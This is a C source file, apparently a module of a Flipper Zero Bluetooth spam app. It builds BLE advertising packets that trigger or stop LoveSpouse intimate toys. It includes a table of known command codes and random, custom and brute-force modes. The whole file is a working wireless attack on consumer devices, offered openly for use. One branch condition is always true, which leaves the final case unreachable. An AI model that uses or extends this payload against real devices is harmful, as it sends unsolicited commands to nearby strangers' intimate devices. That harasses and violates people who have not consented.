#include "lovespouse.h"
#include "_protocols.h"

// Hacked together by @Willy-JL
// Discovered by @mandomat
// Blog post at https://mandomat.github.io/2023-11-13-denial-of-pleasure/

typedef struct {
    uint32_t value;
    const char* name;
} LovespouseMode;

static const LovespouseMode plays[] = {
    {0xE49C6C, "Classic 1"},       {0xE7075E, "Classic 2"},       {0xE68E4F, "Classic 3"},
    {0xE1313B, "Classic 4"},       {0xE0B82A, "Classic 5"},       {0xE32318, "Classic 6"},
    {0xE2AA09, "Classic 7"},       {0xED5DF1, "Classic 8"},       {0xECD4E0, "Classic 9"},
    {0xD41F5D, "Independent 1-1"}, {0xD7846F, "Independent 1-2"}, {0xD60D7E, "Independent 1-3"},
    {0xD1B20A, "Independent 1-4"}, {0xD0B31B, "Independent 1-5"}, {0xD3A029, "Independent 1-6"},
    {0xD22938, "Independent 1-7"}, {0xDDDEC0, "Independent 1-8"}, {0xDC57D1, "Independent 1-9"},
    {0xA4982E, "Independent 2-1"}, {0xA7031C, "Independent 2-2"}, {0xA68A0D, "Independent 2-3"},
    {0xA13579, "Independent 2-4"}, {0xA0BC68, "Independent 2-5"}, {0xA3275A, "Independent 2-6"},
    {0xA2AE4B, "Independent 2-7"}, {0xAD59B3, "Independent 2-8"}, {0xACD0A2, "Independent 2-9"},
};

static const LovespouseMode stops[] = {
    {0xE5157D, "Classic Stop"},
    {0xD5964C, "Independent 1 Stop"},
    {0xA5113F, "Independent 2 Stop"},
};

static const struct {
    const LovespouseMode* modes;
    uint8_t count;
} modes[LovespouseStateCOUNT] = {
    [0] = {plays, COUNT_OF(plays)},
    [LovespouseStatePlay] = {plays, COUNT_OF(plays)},
    [LovespouseStateStop] = {stops, COUNT_OF(stops)},
};

static const char* get_name(const Payload* payload) {
    UNUSED(payload);
    return "LoveSpouse";
}

static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    LovespouseCfg* cfg = payload ? &payload->cfg.lovespouse : NULL;

    LovespouseState state;
    if(cfg && cfg->state != 0x00) {
        state = cfg->state;
    } else {
        const LovespouseState states[] = {
            LovespouseStatePlay,
            LovespouseStateStop,
        };
        state = states[rand() % COUNT_OF(states)];
    }

    uint32_t mode;
    switch(cfg ? payload->mode : PayloadModeRandom) {
    case PayloadModeRandom:
    default:
        mode = modes[state].modes[rand() % modes[state].count].value;
        break;
    case PayloadModeValue:
        mode = cfg->mode;
        break;
    case PayloadModeBruteforce:
        mode = cfg->mode = payload->bruteforce.value;
        break;
    }

    uint8_t size = 22;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 2; // Size
    packet[i++] = 0x01; // AD Type (Flags)
    packet[i++] = 0x1A; // Flags

    packet[i++] = 14; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0xFF; // Company ID (Typo Products, LLC)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x6D;
    packet[i++] = 0xB6;
    packet[i++] = 0x43;
    packet[i++] = 0xCE;
    packet[i++] = 0x97;
    packet[i++] = 0xFE;
    packet[i++] = 0x42;
    packet[i++] = 0x7C;
    packet[i++] = (mode >> 0x10) & 0xFF;
    packet[i++] = (mode >> 0x08) & 0xFF;
    packet[i++] = (mode >> 0x00) & 0xFF;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x8F; // Service UUID (Unregistered)
    packet[i++] = 0xAE; // ...

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigMode,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigMode:
        scene_manager_next_scene(ctx->scene_manager, SceneLovespouseMode);
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void mode_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    LovespouseCfg* cfg = &payload->cfg.lovespouse;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        payload->mode = PayloadModeValue;
        cfg->mode = modes[cfg->state].modes[index].value;
        variable_item_set_current_value_text(item, modes[cfg->state].modes[index].name);
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    LovespouseCfg* cfg = &payload->cfg.lovespouse;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    size_t value_index;

    item = variable_item_list_add(
        list, "Toy Mode", modes[cfg->state].count + 1, mode_changed, payload);
    const char* mode_name = NULL;
    char mode_name_buf[9];
    switch(payload->mode) {
    case PayloadModeRandom:
    default:
        mode_name = "Random";
        value_index = 0;
        break;
    case PayloadModeValue:
        for(uint8_t i = 0; i < modes[cfg->state].count; i++) {
            if(cfg->mode == modes[cfg->state].modes[i].value) {
                mode_name = modes[cfg->state].modes[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!mode_name) {
            snprintf(mode_name_buf, sizeof(mode_name_buf), "%06lX", cfg->mode);
            mode_name = mode_name_buf;
            value_index = modes[cfg->state].count + 1;
        }
        break;
    case PayloadModeBruteforce:
        mode_name = "Bruteforce";
        value_index = modes[cfg->state].count + 1;
        break;
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, mode_name);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_count(const Payload* payload) {
    UNUSED(payload);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_lovespouse = {
    .icon = &I_heart,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void mode_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    LovespouseCfg* cfg = &payload->cfg.lovespouse;
    if(index == 0) {
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
    } else if(index == modes[cfg->state].count + 1U) {
        scene_manager_next_scene(ctx->scene_manager, SceneLovespouseModeCustom);
    } else if(modes[cfg->state].count + 2U) {
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->mode;
        payload->bruteforce.size = 3;
        scene_manager_previous_scene(ctx->scene_manager);
    } else {
        payload->mode = PayloadModeValue;
        cfg->mode = modes[cfg->state].modes[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
    }
}
void scene_lovespouse_mode_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    LovespouseCfg* cfg = &payload->cfg.lovespouse;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, mode_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < modes[cfg->state].count; i++) {
        submenu_add_item(submenu, modes[cfg->state].modes[i].name, i + 1, mode_callback, ctx);
        if(!found && payload->mode == PayloadModeValue &&
           cfg->mode == modes[cfg->state].modes[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", modes[cfg->state].count + 1, mode_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = modes[cfg->state].count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", modes[cfg->state].count + 2, mode_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = modes[cfg->state].count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_lovespouse_mode_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_lovespouse_mode_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void mode_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    LovespouseCfg* cfg = &payload->cfg.lovespouse;
    payload->mode = PayloadModeValue;
    cfg->mode =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_lovespouse_mode_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    LovespouseCfg* cfg = &payload->cfg.lovespouse;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Toy Mode");

    ctx->byte_store[0] = (cfg->mode >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->mode >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->mode >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, mode_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_lovespouse_mode_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_lovespouse_mode_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
